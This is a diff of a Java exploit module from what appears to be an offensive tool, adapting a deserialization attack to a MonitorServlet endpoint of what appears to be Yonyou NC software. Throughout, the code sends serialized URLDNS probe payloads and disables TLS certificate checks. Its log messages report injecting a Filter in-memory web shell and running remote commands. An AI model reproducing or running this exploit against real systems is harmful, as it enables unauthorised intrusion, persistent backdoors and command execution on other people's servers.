@@ -17,7 +17,7 @@ import java.io.ObjectOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class NCMessageServlet extends VulnBase {
+public class MonitorServlet_Unserialize extends VulnBase {
     public static boolean DNSLOG = true;
     public static boolean JNDI = false;
     public static boolean EXEC = true;
@@ -26,16 +26,16 @@ public class NCMessageServlet extends VulnBase {
 
     private String flag = "yyds";
 
-    public NCMessageServlet() {
+    public MonitorServlet_Unserialize() {
     }
 
-    public NCMessageServlet(TextArea log, TextArea uploadLog, TextArea execLog) {
+    public MonitorServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
         super(log, uploadLog, execLog);
     }
 
     @Override
     public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
-        String vulnerable_url = Config.TARGET + "/servlet/~baseapp/nc.message.bs.NCMessageServlet";
+        String vulnerable_url = Config.TARGET + "/servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet";
 
         try {
             if (Config.MOD.equals("poc")) {
@@ -69,7 +69,7 @@ public class NCMessageServlet extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             // 发送请求
-            byte[] postData = Util.getSerializedData(URLDNS.getObject("NCMessageServlet." + Config.DNSLOG));
+            byte[] postData = Util.getSerializedData(URLDNS.getObject("MonitorServlet." + Config.DNSLOG));
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
@@ -83,12 +83,12 @@ public class NCMessageServlet extends VulnBase {
 
             int responseCode = HttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                logMessage("[+] NCMessageServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
+                logMessage("[+] MonitorServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
-                logMessage("[-] NCMessageServlet 反序列化探测失败, 状态码: " + responseCode);
+                logMessage("[-] MonitorServlet 反序列化探测失败, 状态码: " + responseCode);
             }
         } catch (Exception e) {
-            logMessage("[-] NCMessageServlet 反序列化探测失败, 请尝试手动探测. " + e);
+            logMessage("[-] MonitorServlet 反序列化探测失败, 请尝试手动探测. " + e);
         }
     }
 
@@ -120,11 +120,11 @@ public class NCMessageServlet extends VulnBase {
                 logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                 return;
             } else {
-                logMessage("[-] NCMessageServlet 反序列化利用失败, 状态码: " + responseCode);
+                logMessage("[-] MonitorServlet 反序列化利用失败, 状态码: " + responseCode);
                 return;
             }
         } catch (Exception e) {
-            logMessage("[-] NCMessageServlet 反序列化利用失败, 请尝试手动利用. " + e);
+            logMessage("[-] MonitorServlet 反序列化利用失败, 请尝试手动利用. " + e);
             return;
         }
     }
@@ -158,7 +158,7 @@ public class NCMessageServlet extends VulnBase {
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
-                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 3506));
+                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 4));
                 return;
             } else {
                 logExec("[-] 命令执行失败. 请尝试手动利用.");
